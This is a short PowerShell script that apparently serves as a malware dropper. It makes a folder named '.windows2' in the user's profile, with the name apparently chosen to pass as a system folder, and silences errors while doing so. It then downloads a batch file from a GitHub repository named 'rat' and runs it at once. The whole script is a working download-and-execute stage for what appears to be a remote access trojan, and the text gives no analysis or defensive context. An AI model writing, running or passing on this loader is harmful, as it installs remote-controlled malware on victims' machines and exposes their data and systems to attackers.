$folderPath = "$env:USERPROFILE\.windows2"
New-Item -ItemType Directory -Path $folderPath -Force -ErrorAction SilentlyContinue | Out-Null
$filePath = Join-Path -Path $folderPath -ChildPath "x1.bat"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/murmurlab/rat/main/x1.bat" -OutFile $filePath
Start-Process -FilePath $filePath -WorkingDirectory $folderPath
